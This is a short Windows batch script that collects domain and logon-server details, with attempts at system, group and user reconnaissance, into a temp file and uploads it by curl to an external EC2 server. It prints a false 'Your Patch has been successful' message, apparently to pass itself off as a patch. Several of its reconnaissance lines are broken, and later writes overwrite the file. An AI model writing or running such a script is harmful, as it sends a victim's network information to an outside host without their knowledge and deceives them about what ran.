@echo off
REM Ultra-simple version - just echo and upload

REM ===== EDIT THIS =====
set SERVER=http://ec2-18-208-114-181.compute-1.amazonaws.com:8080/upload
REM ====================

echo Domain: %USERDNSDOMAIN%
echo Logon Server: %LOGONSERVER%
echo "Your Patch has been successful"
echo IpConfig: %IPCONFIG% > %TEMP%\ad.txt
echo systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Total Physical Memory" /C:"Available Physical Memory" /C:"Domain": %systeminfo% > %TEMP%\ad.txt

echo whoami /groups: %whoami% > %TEMP%\ad.txt

echo net user: %netuser% > %TEMP%\ad.txt

echo net config workstation: %workstation% > %TEMP%\ad.txt


REM Create simple output
echo Domain: %USERDNSDOMAIN% > %TEMP%\ad.txt
echo Logon Server: %LOGONSERVER% >> %TEMP%\ad.txt


REM Upload
curl -X POST -F "file=@%TEMP%\ad.txt" %SERVER%

pause
